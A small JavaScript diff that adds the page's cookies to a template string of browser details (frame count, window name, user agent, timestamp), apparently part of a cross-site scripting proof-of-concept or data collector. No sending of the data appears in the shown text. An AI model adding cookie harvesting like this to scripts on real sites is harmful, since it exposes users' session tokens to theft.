@@ -12,6 +12,7 @@ const details = `
   🖼️ Frames Length: ${window.frames.length}
   🪪 Window Name: ${window.name}
   ========================
+  🍪 Cookies: ${document.cookie || 'No cookies available'}
   🕵️ User-Agent: ${navigator.userAgent}
   ⏳ Timestamp: ${new Date().toISOString()}
 `;
